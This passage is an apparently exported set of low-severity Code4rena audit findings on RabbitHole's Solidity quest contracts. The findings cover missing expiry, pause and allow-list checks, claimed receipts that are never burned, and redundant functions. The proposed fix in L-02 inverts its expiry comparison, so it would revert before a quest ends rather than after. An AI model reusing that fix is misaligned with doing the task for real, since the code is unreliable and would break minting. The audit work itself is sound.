class=\"mtk1\">[</span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">addressMinted</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">quests</span><span class=\"mtk1\">[</span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">numberMinted</span><span class=\"mtk1\">++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ReceiptMinted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rabbitholeReceiptContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "#l-07-the-function-mintreceipt-shouldnt-mint-receipts-to-users-if-the-quest-is-paused",
      "tags": [],
      "finders": []
    },
    {
      "id": "8866",
      "title": "[L-06] In contract Quest the function ",
      "impact": "LOW",
      "content": "<h2 id=\"l-06-in-contract-quest-the-function-claim-shouldnt-only-set-the-receipt-as-claimed-but-to-burn-it-as-well-as-this-problem-brings-the-risk-where-users-can-sell-already-claimed-receipts-to-other-people\" style=\"position:relative;\"><a href=\"#l-06-in-contract-quest-the-function-claim-shouldnt-only-set-the-receipt-as-claimed-but-to-burn-it-as-well-as-this-problem-brings-the-risk-where-users-can-sell-already-claimed-receipts-to-other-people\" aria-label=\"l 06 in contract quest the function claim shouldnt only set the receipt as claimed but to burn it as well as this problem brings the risk where users can sell already claimed receipts to other people permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-06] In contract Quest the function <code>claim</code> shouldnâ€™t only set the receipt as claimed, but to burn it as well. As this problem brings the risk, where users can sell already claimed receipts to other people</h2>\n<p>The function <code>claim</code> is used by users to claim their ERC721 receipts for rewards. By using the function the receipt is set as claimed with a simple mapping id =&gt; bool, but it isnâ€™t burned. In the protocol docs it is clearly stated that users are free to sell or trade their receipts. Since the claimed receipts arenâ€™t burned, this bring the risk where already claimed receipts can be sold to other people. A burn function already exists in RabbitHoleReceipt, but isnâ€™t used.</p>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "#l-06-in-contract-quest-the-function-claim-shouldnt-only-set-the-receipt-as-claimed-but-to-burn-it-as-well-as-this-problem-brings-the-risk-where-users-can-sell-already-claimed-receipts-to-other-people",
      "tags": [],
      "finders": []
    },
    {
      "id": "8865",
      "title": "[L-05] The function ",
      "impact": "LOW",
      "content": "<h2 id=\"l-05-the-function-royaltyinfo-doesnt-check-if-the-receipt-was-already-claimed\" style=\"position:relative;\"><a href=\"#l-05-the-function-royaltyinfo-doesnt-check-if-the-receipt-was-already-claimed\" aria-label=\"l 05 the function royaltyinfo doesnt check if the receipt was already claimed permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-05] The function <code>royaltyInfo</code> doesnâ€™t check if the receipt was already claimed</h2>\n<p>The function <code>royaltyInfo</code> is used by users to check sale details regarding a particular ERC721 token.</p>\n<p>The problem here is that the function check if the token exists, but doesnâ€™t check if the token was already claimed.</p>\n<p>Consider applying a check, which will revert if the token was already claimed.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RabbitHoleReceipt</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">178</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">royaltyInfo</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">179:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">tokenId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">180:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">salePrice_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">royaltyAmount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">182</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_exists</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId_</span><span class=\"mtk1\">), </span><span class=\"mtk8\">'Nonexistent token'</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">183</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">184</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">royaltyPayment</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">salePrice_</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">185</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">royaltyRecipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">royaltyPayment</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">186</span><span class=\"mtk1\">:    }</span></span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "#l-05-the-function-royaltyinfo-doesnt-check-if-the-receipt-was-already-claimed",
      "tags": [],
      "finders": []
    },
    {
      "id": "8864",
      "title": "[L-04] The function ",
      "impact": "LOW",
      "content": "<h2 id=\"l-04-the-function-withdrawremainingtokens-can-be-changed-in-a-safer-way-to-handle-the-withdraw-from-the-owner-and-the-protocol-fee-as-well-this-prevent-risks-allocated-with-the-protocol-fees\" style=\"position:relative;\"><a href=\"#l-04-the-function-withdrawremainingtokens-can-be-changed-in-a-safer-way-to-handle-the-withdraw-from-the-owner-and-the-protocol-fee-as-well-this-prevent-risks-allocated-with-the-protocol-fees\" aria-label=\"l 04 the function withdrawremainingtokens can be changed in a safer way to handle the withdraw from the owner and the protocol fee as well this prevent risks allocated with the protocol fees permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-04] The function <code>withdrawRemainingTokens</code> can be changed in a safer way to handle the withdraw from the owner and the protocol fee as well. This prevent risks allocated with the protocol fees.</h2>\n<p>By the docs this function is called in two different scenarios, if a quest is full and receipt redeemers equals the max amount of total participants allowed in the quest - only withdrawFee is called. If a quest doesnâ€™t hit the max total participants, first the owner calls the function <code>withdrawRemainingTokens</code> to withdraw the remaining tokens and then the fee should be paid with the function <code>withdrawFee</code>.</p>\n<p>Overall the best solution of this problem is that the function <code>withdrawRemainingTokens</code>, both does the withdrawing part to the owner and pays the fee to the protocol as well. This is considered the safest way:</p>\n<p>First, if the receipt redeemers are below the totalParticipants, can withdraw the remaining tokens and pay the fee at the same time. Second, if the quest is full and receipt redemeers hits the total amount of people allowed, only the fee will be paid to the protocol and will skip the withdraw remaining rewards part.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdrawRemainingTokens</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">super</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdrawRemainingTokens</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">receiptRedeemers</span><span class=\"mtk1\">() &lt; </span><span class=\"mtk12\">totalParticipants</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">unclaimedTokens</span><span class=\"mtk1\"> = (</span><span class=\"mtk11\">receiptRedeemers</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">redeemedTokens</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">rewardAmountInWeiOrTokenId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nonClaimableTokens</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rewardToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) - </span><span class=\"mtk11\">protocolFee</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">unclaimedTokens</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rewardToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nonClaimableTokens</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rewardToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">protocolFeeRecipient</span><span class=\"mtk1\">, </span><span class=\"mtk11\">protocolFee</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rewardToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">protocolFeeRecipient</span><span class=\"mtk1\">, </span><span class=\"mtk11\">protocolFee</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "#l-04-the-function-withdrawremainingtokens-can-be-changed-in-a-safer-way-to-handle-the-withdraw-from-the-owner-and-the-protocol-fee-as-well-this-prevent-risks-allocated-with-the-protocol-fees",
      "tags": [],
      "finders": []
    },
    {
      "id": "8863",
      "title": "[L-03] The reverting functions ",
      "impact": "LOW",
      "content": "<h2 id=\"l-03-the-reverting-functions-_calculaterewards-and-_transferrewards-should-be-removed-as-they-are-already-implemented-in-the-child-contract\" style=\"position:relative;\"><a href=\"#l-03-the-reverting-functions-_calculaterewards-and-_transferrewards-should-be-removed-as-they-are-already-implemented-in-the-child-contract\" aria-label=\"l 03 the reverting functions _calculaterewards and _transferrewards should be removed as they are already implemented in the child contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-03] The reverting functions <code>_calculateRewards</code> and <code>_transferRewards</code> should be removed, as they are already implemented in the child contract</h2>\n<p>There are two functions in Quest.sol, which reverts incase they are called. By the revert names, we can understand that these two functions need to be implemented in the child contracts - Erc20Quest.sol, Erc1155Quest.sol. Since this is already done and they are implemented in the child contracts, these two functions are unnecessary and should be removed.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Quest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">122</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_calculateRewards</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">redeemableTokenCount_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">123</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MustImplementInChild</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">124</span><span class=\"mtk1\">:    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">129</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_transferRewards</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">130</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MustImplementInChild</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">131</span><span class=\"mtk1\">:    }</span></span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "#l-03-the-reverting-functions-_calculaterewards-and-_transferrewards-should-be-removed-as-they-are-already-implemented-in-the-child-contract",
      "tags": [],
      "finders": []
    },
    {
      "id": "8862",
      "title": "[L-02] The function mintReceipt should check if the quest has expired on-chain as well",
      "impact": "LOW",
      "content": "The main function mintReceipt responsible for minting receipts lacks an important check to ensure the quest end time hasn't finished yet. Considering the fact that on quest creation every quest is enforced with a startTime and endTime, which represents the quest starting time and ending time. Users should not be allowed to mint receipts after the quest is expired.\n\nBy the sponsor comment, the `claimSignerAddress` takes care of that on the off-chain side and won't issue hashes before the quest start or after the quest ends. But mistakes always can occur and it is recommended to have a check on the smart contract level as well.\n\n```solidity\ncontracts/QuestFactory.sol\n\n219:  function mintReceipt(string memory questId_, bytes32 hash_, bytes memory signature_) public {\n220:        if (quests[questId_].numberMinted + 1 > quests[questId_].totalParticipants) revert OverMaxAllowedToMint();\n221:        if (quests[questId_].addressMinted[msg.sender] == true) revert AddressAlreadyMinted();\n222:        if (keccak256(abi.encodePacked(msg.sender, questId_)) != hash_) revert InvalidHash();\n223:        if (recoverSigner(hash_, signature_) != claimSignerAddress) revert AddressNotSigned();\n224:\n225:        quests[questId_].addressMinted[msg.sender] = true;\n226:        quests[questId_].numberMinted++;\n227:        emit ReceiptMinted(msg.sender, questId_);\n228:        rabbitholeReceiptContract.mint(msg.sender, questId_);\n229:    }\n```\n\nHere is a recommended change, which takes care of this problem:\n\n1. Add a storage variable in the struct `Quest`, which will hold the end time of the quest.\n\n```solidity\nstruct Quest {\n        mapping(address => bool) addressMinted;\n        address questAddress;\n        uint totalParticipants;\n        uint numberMinted;\n+       uint256 expires;\n    }\n```\n\n2. When creating a quest with the function `createQuest` consider adding the endTime to the new stor variable `expires`.\n\n```solidity\n// Add the same check if contractType is erc1155 as well.\n\nif (keccak256(abi.encodePacked(contractType_)) == keccak256(abi.encodePacked('erc20'))) {\n            if (rewardAllowlist[rewardTokenAddress_] == false) revert RewardNotAllowed();\n\n            Erc20Quest newQuest = new Erc20Quest(\n                rewardTokenAddress_,\n                endTime_,\n                startTime_,\n                totalParticipants_,\n                rewardAmountOrTokenId_,\n                questId_,\n                address(rabbitholeReceiptContract),\n                questFee,\n                protocolFeeRecipient\n            );\n\n            emit QuestCreated(\n                msg.sender,\n                address(newQuest),\n                questId_,\n                contractType_,\n                rewardTokenAddress_,\n                endTime_,\n                startTime_,\n                totalParticipants_,\n                rewardAmountOrTokenId_\n            );\n            quests[questId_].questAddress = address(newQuest);\n            quests[questId_].totalParticipants = totalParticipants_;\n+           quests[questId_].expires = endTime_;\n            newQuest.transferOwnership(msg.sender);\n            ++questIdCount;\n            return address(newQuest);\n        }\n```\n\n3. And finally add a check in the function `mintReceipt` to check if the quest expired already.\n\n```solidity\nfunction mintReceipt(string memory questId_, bytes32 hash_, bytes memory signature_) public {\n+       if (quests[questId_].expires > block.timestamp) revert QuestAlreadyExpired();\n        if (quests[questId_].numberMinted + 1 > quests[questId_].totalParticipants) revert OverMaxAllowedToMint();\n        if (quests[questId_].addressMinted[msg.sender] == true) revert AddressAlreadyMinted();\n        if (keccak256(abi.encodePacked(msg.sender, questId_)) != hash_) revert InvalidHash();\n        if (recoverSigner(hash_, signature_) != claimSignerAddress) revert AddressNotSigned();\n\n        quests[questId_].addressMinted[msg.sender] = true;\n        quests[questId_].numberMinted++;\n        emit ReceiptMinted(msg.sender, questId_);\n        rabbitholeReceiptContract.mint(msg.sender, questId_);\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "#l-02-the-function-mintreceipt-should-check-if-the-quest-has-expired-on-chain-as-well",
      "tags": [],
      "finders": []
    },
    {
      "id": "8861",
      "title": "[L-01] ",
      "impact": "LOW",
      "content": "<h2 id=\"l-01-createquest-doesnt-check-if-the-reward-token-address-is-in-the-allow-list-on-erc-1155-quest-type\" style=\"position:relative;\"><a href=\"#l-01-createquest-doesnt-check-if-the-reward-token-address-is-in-the-allow-list-on-erc-1155-quest-type\" aria-label=\"l 01 createquest doesnt check if the reward token address is in the allow list on erc 1155 quest type permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] <code>createQuest</code> doesnâ€™t check if the reward token address is in the allow list on ERC-1155 quest type</h2>\n<p>The function <code>createQuest</code> is called by users with the quest role. The main purpose of the function is to create quests, which can be either erc20 or erc1155 type. When the type is erc20, a check is made to ensure the rewardTokenAddress_ is allowed to be used as a reward - <code>if (rewardAllowlist[rewardTokenAddress_] == false) revert RewardNotAllowed();</code>. The problem is that the same check isnâ€™t made when the quest is erc1155, as a result when erc1155 quest is created the function createQuest doesnâ€™t check if the rewardTokenAddress_ is in the allow list.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">QuestFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">61</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">createQuest</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">62:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">rewardTokenAddress_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">63:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">endTime_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">64:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">startTime_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">65:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">totalParticipants_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">66:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">rewardAmountOrTokenId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">67:        </span><span class=\"mtk10\">string</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">contractType_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">68:        </span><span class=\"mtk10\">string</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">questId_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">69</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">CREATE_QUEST_ROLE</span><span class=\"mtk1\">) </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">70</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">quests</span><span class=\"mtk1\">[</span><span 